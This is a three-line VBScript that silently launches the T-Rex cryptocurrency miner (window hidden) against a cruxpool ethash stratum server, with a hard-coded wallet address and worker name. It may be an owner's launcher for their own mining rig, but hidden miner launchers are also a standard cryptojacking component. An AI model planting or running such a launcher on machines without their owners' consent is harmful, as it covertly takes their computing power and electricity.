Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "trex.exe" & Chr(34) & " -a ethash -o stratum+tcp://ethw.cruxpool.com:5555 -u 0x1702C0EfcaeF99C27583d1e121D4554Af7137C3F -w RIG001 -p x", 0
Set WshShell = Nothing
